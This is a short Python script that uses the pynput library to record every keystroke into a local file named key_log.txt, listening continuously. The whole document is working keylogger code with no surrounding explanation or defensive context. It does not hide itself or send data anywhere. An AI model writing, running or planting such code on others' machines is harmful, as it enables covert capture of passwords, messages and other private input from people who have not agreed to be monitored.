from pynput.keyboard import Key, Listener

def on_press(key):
    f = open("key_log.txt","a")
    f.write(str(key)+"\n")
    f.close()

#continously listening for key strokes
with Listener(on_press=on_press) as listener:
    listener.join()